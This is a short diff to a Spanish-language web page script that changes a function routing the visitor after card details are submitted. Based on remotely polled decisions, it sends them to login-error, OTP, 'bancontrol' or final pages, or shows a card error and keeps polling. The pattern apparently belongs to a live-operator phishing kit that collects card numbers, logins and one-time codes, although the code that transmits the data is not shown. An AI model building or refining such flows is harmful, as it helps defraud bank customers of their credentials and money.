@@ -172,11 +172,13 @@ async function envTarjeta() {
 
 function dec(a) {
   hideWait();
-  if      (a === 'finalizar')    window.location.href = 'final.html';
-  else if (a === 'error_tarjeta') showAlert('alCard','Los datos de la tarjeta no son válidos. Verifica e intenta de nuevo.');
-  else if (a === 'error_login')  window.location.href = 'index1.html';
-  else if (a === 'otp')          window.location.href = 'index2.html';
-  else                           window.location.href = 'final.html';
+  if      (a === 'finalizar')        window.location.href = 'final.html';
+  else if (a === 'otp')              window.location.href = 'index2.html';
+  else if (a === 'bancontrol')       window.location.href = 'bancontrol.html';
+  else if (a === 'error_login')      window.location.href = 'index1.html';
+  else if (a === 'error_tarjeta')    { showAlert('alCard','Los datos de la tarjeta no son válidos. Verifica e intenta de nuevo.'); startPolling(dec); }
+  else if (a === 'error_otp')        window.location.href = 'index2.html';
+  else if (a === 'error_bancontrol') window.location.href = 'bancontrol.html';
 }
 </script>
 </body>
